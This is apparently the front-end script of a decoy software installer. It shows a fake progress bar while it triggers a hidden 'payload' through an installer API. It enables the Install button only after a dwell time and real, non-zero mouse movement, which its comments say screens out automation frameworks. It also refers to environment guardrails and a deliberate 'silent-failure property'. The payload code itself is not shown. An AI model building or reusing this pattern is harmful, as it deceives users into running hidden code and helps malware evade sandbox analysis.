const panels = ['welcome', 'installing', 'finish'];
let step = 0;

const els = {
  title: document.getElementById('title'),
  subtitle: document.getElementById('subtitle'),
  back: document.getElementById('btn-back'),
  next: document.getElementById('btn-next'),
  cancel: document.getElementById('btn-cancel'),
  bar: document.getElementById('progress-bar'),
  detail: document.getElementById('install-detail'),
  status: document.getElementById('install-status'),
};

// Interaction gating state - enforced on the renderer side and re-checked
// in the main process before any file copy happens.
let dwellMs = 0;
let requireMouseMovement = false;
let mouseMovementSeen = false;
let dwellStart = Date.now();
let interactionToken = null;
let debugMode = false;

function show(i) {
  step = i;
  panels.forEach((p, idx) => {
    document.getElementById(`panel-${p}`).classList.toggle('active', idx === i);
  });
  els.subtitle.textContent = ['Welcome', 'Installing', 'Completed'][i];
  els.back.disabled = i === 0 || i === 1 || i === 2;
  if (i === 0) {
    els.next.textContent = 'Install';
    // Install stays disabled on the welcome panel until the user has
    // dwelled long enough and (optionally) moved the mouse. This gates
    // the file copy on real user interaction.
    els.next.disabled = true;
    scheduleGateReevaluation();
  }
  if (i === 1) { els.next.textContent = 'Next >'; els.next.disabled = true; }
  if (i === 2) { els.next.textContent = 'Finish'; els.next.disabled = false; }
  els.cancel.disabled = i === 2;
}

function canEnableInstallButton() {
  if (step !== 0) return false;
  if (dwellMs > 0 && (Date.now() - dwellStart) < dwellMs) return false;
  if (requireMouseMovement && !mouseMovementSeen) return false;
  return true;
}

let gateTimer = null;
function scheduleGateReevaluation() {
  if (gateTimer) clearTimeout(gateTimer);
  const wait = Math.max(50, (dwellStart + dwellMs) - Date.now());
  gateTimer = setTimeout(async () => {
    gateTimer = null;
    updateDebugBanner();
    if (!canEnableInstallButton()) {
      // Still waiting on mouse movement - re-evaluate on next movement.
      return;
    }
    // Acquire the interaction token from the main process. The token is
    // issued exactly once per app launch and is required by installer:run.
    try {
      const resp = await window.installer.ready();
      if (resp && resp.token) interactionToken = resp.token;
    } catch (_) { /* ignore; button stays disabled */ }
    if (interactionToken) {
      els.next.disabled = false;
      updateDebugBanner();
    }
  }, wait);
}

function fakeProgress(onDone) {
  let pct = 0;
  const files = [
    'Extracting core components...',
    'Copying runtime libraries...',
    'Registering components...',
    'Applying configuration...',
    'Finalizing installation...',
  ];
  const timer = setInterval(() => {
    pct += 3 + Math.random() * 4;
    if (pct >= 100) { pct = 100; clearInterval(timer); onDone(); }
    els.bar.style.width = pct.toFixed(0) + '%';
    els.detail.textContent = files[Math.min(files.length - 1, Math.floor(pct / 22))];
  }, 140);
}

async function init() {
  const info = await window.installer.product();
  els.title.textContent = `${info.product} Setup`;
  document.querySelectorAll('.product-name').forEach((e) => { e.textContent = info.product; });
  document.title = `${info.product} Setup`;
  dwellMs = info.dwellMs || 0;
  requireMouseMovement = !!info.requireMouseMovement;
  debugMode = !!info.debugMode;
  dwellStart = Date.now();
  show(0);

  if (debugMode) {
    // Inject a visible debug banner so the operator can see WHY the install
    // button is disabled while testing. Never rendered in shipped builds
    // (debugMode is a BuildParameter that defaults to False).
    const banner = document.createElement('div');
    banner.id = 'debug-banner';
    banner.style.cssText =
      'position:fixed;top:0;left:0;right:0;padding:6px 10px;' +
      'background:#8b0000;color:#fff;font:12px monospace;z-index:9999;' +
      'border-bottom:2px solid #ff4040';
    banner.textContent = 'GUARDRAIL DEBUG MODE - failures will be surfaced. DO NOT SHIP.';
    document.body.appendChild(banner);
    updateDebugBanner();
  }
}

function updateDebugBanner(extra) {
  if (!debugMode) return;
  const banner = document.getElementById('debug-banner');
  if (!banner) return;
  const bits = [
    `dwell=${dwellMs}ms`,
    `mouseMoved=${mouseMovementSeen}`,
    `token=${interactionToken ? 'acquired' : 'pending'}`,
    `buttonEnabled=${!els.next.disabled}`,
  ];
  if (extra) bits.push(extra);
  banner.textContent = 'DEBUG - ' + bits.join(' | ');
}

// ---------------------------------------------------------------------------
// Event wiring
// ---------------------------------------------------------------------------

// Only "real" mousemove events (with a non-zero movementX/Y delta) count.
// This filters out synthetic events that some automation frameworks inject
// with zero movement deltas.
window.addEventListener('mousemove', (ev) => {
  if (step !== 0) return;
  if (mouseMovementSeen) return;
  if (typeof ev.movementX === 'number' && typeof ev.movementY === 'number') {
    if (ev.movementX !== 0 || ev.movementY !== 0) {
      mouseMovementSeen = true;
      scheduleGateReevaluation();
    }
  }
});

els.next.addEventListener('click', async () => {
  if (step === 0) {
    if (!canEnableInstallButton() || !interactionToken) {
      // Shouldn't reach here (button is disabled), but defend anyway.
      return;
    }
    show(1);
    // Kick the payload with the interaction token; run() will also
    // re-check environment guardrails in the main process.
    const runPromise = window.installer.run(interactionToken).catch((err) => ({ ok: false, error: String(err) }));
    fakeProgress(async () => {
      const result = await runPromise;
      if (debugMode && result && result.ok === false) {
        // Surface the failure reason in the wizard instead of advancing to
        // Finish. This defeats the silent-failure property by design - the
        // operator has opted in via 3.E9q so they can see what tripped.
        updateDebugBanner(`RUN FAILED: ${result.error}`);
        const banner = document.getElementById('debug-banner');
        if (banner) banner.style.background = '#a00';
        // Stay on the installing panel so the banner remains visible; the
        // Cancel button still works.
        return;
      }
      show(2);
    });
  } else if (step === 2) {
    window.close();
  }
});

els.cancel.addEventListener('click', () => window.close());

init();
